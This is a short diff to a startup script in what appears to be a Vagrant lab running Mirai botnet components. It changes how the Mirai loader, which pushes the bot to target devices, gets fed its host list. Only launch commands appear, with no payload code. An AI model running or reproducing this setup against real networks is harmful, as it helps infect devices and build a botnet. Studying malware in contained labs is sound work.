@@ -6,7 +6,7 @@ duende /vagrant/mirai/release/cnc
 
 echo ">>> Startig loader..."
 cd /vagrant/mirai/loader
-./loader < /vagrant/configs/hosts.txt
+/vagrant/mirai/reports/reports /vagrant/configs/hosts.txt | ./loader.dbg
 
 
 
